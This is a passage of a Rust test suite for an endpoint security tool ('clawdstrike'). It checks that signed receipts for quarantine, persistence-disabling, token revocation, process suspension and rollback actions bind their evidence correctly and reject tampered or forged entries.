        assert!(missing_bundle_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle content hash evidence"));

        let mut mismatched_bundle_content_hash = receipt.clone();
        if let Some(bundle_content_hash_evidence) = mismatched_bundle_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleContentHash")
        {
            *bundle_content_hash_evidence =
                EndpointReceiptEvidence::hashed("evidenceBundleContentHash", "sha256:other");
        }
        assert!(mismatched_bundle_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle content hash evidence hash"));

        let mut empty_bundle_id = receipt.clone();
        if let Some(bundle_id_evidence) = empty_bundle_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleId")
        {
            *bundle_id_evidence = EndpointReceiptEvidence::hashed("evidenceBundleId", "");
        }
        assert!(empty_bundle_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle id evidence"));

        let mut mismatched_bundle_id = receipt.clone();
        if let Some(bundle_id_evidence) = mismatched_bundle_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleId")
        {
            *bundle_id_evidence =
                EndpointReceiptEvidence::hashed("evidenceBundleId", "evidence_bundle:other");
        }
        assert!(mismatched_bundle_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle id evidence hash"));

        let mut relabeled_execution_id = receipt.clone();
        relabeled_execution_id.decision.finding_id = Some("response_execution:other".to_string());
        if let Some(execution_id_evidence) = relabeled_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(relabeled_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));

        let mut empty_response_action_id = receipt.clone();
        if let Some(response_action_id) = empty_response_action_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id = EndpointReceiptEvidence::hashed("responseActionId", "");
        }
        assert!(empty_response_action_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence"));

        let mut mismatched_response_action_id = receipt.clone();
        if let Some(response_action_id) = mismatched_response_action_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id =
                EndpointReceiptEvidence::hashed("responseActionId", "response_action:other");
        }
        assert!(mismatched_response_action_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence hash"));

        let mut relabeled_action_contract = receipt.clone();
        relabeled_action_contract.decision.rollback_ref =
            Some("rollback:noop:response_action:other".to_string());
        if let Some(response_action_id) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id =
                EndpointReceiptEvidence::hashed("responseActionId", "response_action:other");
        }
        if let Some(rollback_evidence) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackRef")
        {
            *rollback_evidence = EndpointReceiptEvidence::hashed(
                "rollbackRef",
                "rollback:noop:response_action:other",
            );
        }
        assert!(relabeled_action_contract
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence hash"));

        let fake_effect =
            EndpointResponseExecutionEffect::revoke_grant("local_api_auth_token", "sha256:fake");
        let injected_execution_id = response_execution_id_from_effects(
            plan.action_id.as_str(),
            execution.evidence_bundle.bundle_id.as_str(),
            std::slice::from_ref(&fake_effect),
        )
        .unwrap();
        let mut collect_evidence_with_effect = receipt.clone();
        collect_evidence_with_effect.decision.finding_id = Some(injected_execution_id.clone());
        if let Some(execution_id_evidence) = collect_evidence_with_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", &injected_execution_id);
        }
        if let Some(effect_count_evidence) = collect_evidence_with_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "1");
        }
        collect_evidence_with_effect
            .evidence
            .push(EndpointReceiptEvidence::hashed(
                format!("executionEffect:{}", fake_effect.effect_id),
                response_effect_evidence_value(&fake_effect),
            ));
        assert!(collect_evidence_with_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("collect evidence execution effect evidence"));

        let mut mismatched_dry_run = receipt;
        if let Some(dry_run_evidence) = mismatched_dry_run
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "true");
        }
        assert!(mismatched_dry_run
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution dry-run evidence hash"));

        let mut execution_with_conflicting_actor = execution.clone();
        let mut other_actor = response_actor("endpoint-1");
        other_actor.agent_id = Some("agent-api:other".to_string());
        execution_with_conflicting_actor.actor = Some(other_actor);
        let mismatched_execution_actor = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution_with_conflicting_actor,
                graph: &subgraph,
            },
        );
        assert!(mismatched_execution_actor
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution actor evidence"));
    }

    #[test]
    fn endpoint_failed_response_execution_receipt_binds_status_reason_and_graph() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-non-network-target.txt".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::restrict_egress_execution(
            &process_node_id,
            &subgraph,
            600,
            "restrict graph egress",
        );
        let execution =
            EndpointResponseExecutionReport::failed(&plan, &subgraph, "no network targets")
                .unwrap_or_else(|err| panic!("failed to build failure report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[31u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(execution.status, EndpointResponseExecutionStatus::Failed);
        assert!(execution.reason.contains("no network targets"));
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.title.as_deref(),
            Some("Endpoint response action failed")
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt.evidence.iter().any(|item| {
            item.key == "executionStatus" && item.value_hash == sha256(b"failed").to_hex_prefixed()
        }));

        let mut mismatched_execution_status = receipt.clone();
        if let Some(status_evidence) = mismatched_execution_status
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionStatus")
        {
            *status_evidence = EndpointReceiptEvidence::hashed("executionStatus", "succeeded");
        }
        assert!(mismatched_execution_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution status evidence hash"));

        let mut mismatched_execution_id = receipt.clone();
        if let Some(execution_id_evidence) = mismatched_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(mismatched_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));

        let mut missing_execution_status = receipt;
        missing_execution_status
            .evidence
            .retain(|item| item.key != "executionStatus");
        assert!(missing_execution_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution status evidence"));
    }

    #[test]
    fn endpoint_quarantine_file_execution_receipt_binds_effect_and_graph() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-test-malware.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-test-malware.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-test-malware.sh.quarantine",
            "0xabc123",
            128,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[29u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 29,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::QuarantineFile
        );
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "quarantine_file");
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "effectCount"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffectType:")));

        let mut relabeled_execution_id = receipt.clone();
        relabeled_execution_id.decision.finding_id = Some("response_execution:other".to_string());
        if let Some(execution_id_evidence) = relabeled_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(relabeled_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));

        let mut mismatched_effect_count = receipt.clone();
        if let Some(effect_count_evidence) = mismatched_effect_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "0");
        }
        assert!(mismatched_effect_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect count evidence hash"));

        let mut missing_effect_type = receipt.clone();
        missing_effect_type
            .evidence
            .retain(|item| !item.key.starts_with("executionEffectType:"));
        assert!(missing_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect type evidence"));

        let mut mismatched_effect_type = receipt.clone();
        if let Some(effect_type_evidence) = mismatched_effect_type
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("executionEffectType:"))
        {
            let key = effect_type_evidence.key.clone();
            *effect_type_evidence = EndpointReceiptEvidence::hashed(key, "disable_persistence");
        }
        assert!(mismatched_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect type evidence hash"));

        let mut dropped_effect_evidence = receipt;
        dropped_effect_evidence
            .evidence
            .retain(|item| !item.key.starts_with("executionEffect:"));
        if let Some(effect_count_evidence) = dropped_effect_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "0");
        }
        assert!(dropped_effect_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution effect evidence"));
    }

    #[test]
    fn endpoint_disable_persistence_execution_receipt_binds_effect_and_graph() {
        let event = observation(EndpointEvent::LaunchPersistence {
            path: "/tmp/Library/LaunchAgents/com.example.agent.plist".to_string(),
            label: Some("com.example.agent".to_string()),
            operation: FileOperation::Create,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let persistence_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing persistence file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&persistence_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::disable_persistence_execution(
            &persistence_node_id,
            &subgraph,
            600,
            "disable launch agent persistence",
        );
        let execution = EndpointResponseExecutionReport::disable_persistence(
            &plan,
            &subgraph,
            "/tmp/Library/LaunchAgents/com.example.agent.plist",
            "/tmp/clawdstrike-quarantine/com.example.agent.plist.disabled-persistence",
            "0xabc456",
            512,
        )
        .unwrap_or_else(|err| panic!("failed to build persistence execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[33u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 33,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::DisablePersistence
        );
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "disable_persistence");
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
    }

    #[test]
    fn endpoint_revoke_grant_execution_receipt_binds_revoked_hash_and_graph() {
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::ApiToken,
            path: Some("/Users/alice/.config/clawdstrike/agent-local-token".to_string()),
            name: Some("clawdstrike_agent_auth".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::revoke_grant_execution(
            &process_node_id,
            &subgraph,
            600,
            "revoke touched local agent API credential",
        );
        let revoked_grant_hash = sha256(b"old-local-token").to_hex_prefixed();
        let execution = EndpointResponseExecutionReport::revoke_grant(
            &plan,
            &subgraph,
            "local_api_auth_token",
            &revoked_grant_hash,
        )
        .unwrap_or_else(|err| panic!("failed to build revoke grant execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[39u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 39,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(receipt.decision.action, EndpointDecisionAction::RevokeGrant);
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "revoke_grant");
        assert_eq!(execution.effects[0].target, "local_api_auth_token");
        assert_eq!(
            execution.effects[0].content_hash.as_deref(),
            Some(revoked_grant_hash.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
    }

    #[test]
    fn endpoint_suspend_process_tree_receipts_bind_pid_set_and_resume_effect() {
        let event = EndpointObservation {
            process: EndpointProcess {
                pid: Some(4242),
                process_guid: Some("proc-suspend-root".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python worker.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/python3".to_string(),
                args: vec!["worker.py".to_string()],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::suspend_process_tree_execution(
            &process_node_id,
            &subgraph,
            600,
            "contain process tree for 10 minutes",
        );
        let execution =
            EndpointResponseExecutionReport::suspend_process_tree(&plan, &subgraph, 4242, &[4242])
                .unwrap_or_else(|err| panic!("failed to build suspend execution report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[41u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 41,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::SuspendProcessTree
        );
        assert!(receipt.decision.passed);
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "suspend_process_tree");
        assert_eq!(execution.effects[0].target, "pid:4242");
        assert_eq!(execution.effects[0].artifact.as_deref(), Some("4242"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));

        let rollback = EndpointResponseRollbackReport::suspend_process_tree(
            &execution,
            "resume contained process tree",
            execution.completed_at + chrono::Duration::seconds(10),
        )
        .unwrap_or_else(|err| panic!("failed to build suspend rollback report: {err}"));
        assert_eq!(rollback.action, EndpointDecisionAction::SuspendProcessTree);
        assert_eq!(rollback.effects.len(), 1);
        assert_eq!(rollback.effects[0].effect_type, "resume_process_tree");
        assert_eq!(
            rollback.effects[0].content_hash,
            execution.effects[0].content_hash
        );
    }

    #[test]
    fn endpoint_terminate_process_tree_execution_report_is_rejected() {
        let event = EndpointObservation {
            process: EndpointProcess {
                pid: Some(4343),
                process_guid: Some("proc-terminate-root".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python worker.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/python3".to_string(),
                args: vec!["worker.py".to_string()],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::dry_run(
            EndpointDecisionAction::TerminateProcessTree,
            &process_node_id,
            &subgraph,
            60,
            "model terminate process tree only",
        );
        let report_error = EndpointResponseExecutionReport::terminate_process_tree(
            &plan,
            &subgraph,
            4343,
            &[4343],
        )
        .unwrap_err()
        .to_string();
        assert!(report_error.contains("not rollback-capable"));

        let graph_value = serde_json::to_value(&subgraph)
            .unwrap_or_else(|err| panic!("failed to serialize terminate graph: {err}"));
        let canonical_graph = canonicalize_json(&graph_value)
            .unwrap_or_else(|err| panic!("failed to canonicalize terminate graph: {err}"));
        let graph_content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let effect = EndpointResponseExecutionEffect::terminate_process_tree(4343, &[4343]);
        let completed_at = Utc::now();
        let execution = EndpointResponseExecutionReport {
            execution_id: "response_execution:forged_terminate".to_string(),
            action_id: plan.action_id.clone(),
            action: EndpointDecisionAction::TerminateProcessTree,
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at: completed_at,
            completed_at,
            evidence_bundle: EndpointEvidenceBundleReference {
                bundle_id: "evidence_bundle:forged_terminate".to_string(),
                graph_slice_id: plan.graph_slice_id.clone(),
                content_hash: graph_content_hash,
                node_count: subgraph.nodes.len(),
                edge_count: subgraph.edges.len(),
                created_at: completed_at,
            },
            actor: None,
            effects: vec![effect],
            summary: "forged terminate process tree execution".to_string(),
        };
        let keypair = hush_core::Keypair::from_seed(&[43u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 43,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let err = receipt.sign_with(&keypair).unwrap_err().to_string();
        assert!(err.contains("dry-run response requests"));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::TerminateProcessTree
        );
        assert!(receipt.decision.passed);
        assert_eq!(execution.effects.len(), 1);
        assert_eq!(execution.effects[0].effect_type, "terminate_process_tree");
        assert_eq!(execution.effects[0].target, "pid:4343");
        assert_eq!(execution.effects[0].artifact.as_deref(), Some("4343"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("executionEffect:")));
    }

    #[test]
    fn endpoint_response_rollback_receipt_binds_restore_effect() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-test-rollback.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-test-rollback.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-test-rollback.sh.quarantine",
            "0xdef456",
            256,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let rollback = EndpointResponseRollbackReport::quarantine_file(
            &execution,
            "restore quarantined test file",
            execution.completed_at + chrono::Duration::seconds(30),
        )
        .unwrap_or_else(|err| panic!("failed to build rollback report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[31u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_response_rollback(EndpointResponseRollbackReceiptInput {
                local_sequence: 31,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                rollback: &rollback,
                graph: &subgraph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseRollback
        );
        assert_eq!(receipt.decision.finding_id, Some(rollback.rollback_id));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::QuarantineFile
        );
        assert!(receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(rollback.effects.len(), 1);
        assert_eq!(rollback.effects[0].effect_type, "restore_quarantine_file");
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rollbackStatus"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("rollbackEffect:")));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("rollbackEffectType:")));

        let mut mismatched_rollback_status = receipt.clone();
        if let Some(status_evidence) = mismatched_rollback_status
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackStatus")
        {
            *status_evidence = EndpointReceiptEvidence::hashed("rollbackStatus", "failed");
        }
        assert!(mismatched_rollback_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback status evidence hash"));

        let mut mismatched_rollback_id = receipt.clone();
        if let Some(rollback_id_evidence) = mismatched_rollback_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackId")
        {
            *rollback_id_evidence =
                EndpointReceiptEvidence::hashed("rollbackId", "response_rollback:other");
        }
        assert!(mismatched_rollback_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback id evidence hash"));

        let mut mismatched_execution_id = receipt.clone();
        if let Some(execution_id_evidence) = mismatched_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(mismatched_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback execution id evidence hash"));

        let mut empty_rollback_effect = receipt.clone();
        if let Some(effect_evidence) = empty_rollback_effect
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("rollbackEffect:"))
        {
            let effect_key = effect_evidence.key.clone();
            *effect_evidence = EndpointReceiptEvidence::hashed(effect_key, "");
        }
        let response_action_id = empty_rollback_effect
            .decision
            .rollback_ref
            .as_deref()
            .and_then(|rollback_ref| rollback_ref.strip_prefix("rollback:"))
            .unwrap();
        let rollback_id = response_rollback_id_from_signed_evidence(
            &empty_rollback_effect.evidence,
            response_action_id,
            empty_rollback_effect
                .decision
                .rollback_ref
                .as_deref()
                .unwrap(),
        )
        .unwrap();
        empty_rollback_effect.decision.finding_id = Some(rollback_id.clone());
        if let Some(rollback_id_evidence) = empty_rollback_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackId")
        {
            *rollback_id_evidence = EndpointReceiptEvidence::hashed("rollbackId", rollback_id);
        }
        assert!(empty_rollback_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback effect evidence"));

        let mut missing_rollback_effect_type = receipt.clone();
        missing_rollback_effect_type
            .evidence
            .retain(|item| !item.key.starts_with("rollbackEffectType:"));
        assert!(missing_rollback_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback effect type evidence"));

        let mut mismatched_rollback_effect_type = receipt.clone();
        if let Some(effect_type_evidence) = mismatched_rollback_effect_type
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("rollbackEffectType:"))
        {
            let key = effect_type_evidence.key.clone();
            *effect_type_evidence = EndpointReceiptEvidence::hashed(key, "resume_process_tree");
        }
        assert!(mismatched_rollback_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback effect type evidence hash"));

        let mut missing_execution_id = receipt.clone();
        missing_execution_id
            .evidence
            .retain(|item| item.key != "executionId");
        assert!(missing_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback execution id evidence"));

        let mut missing_rollback_status = receipt;
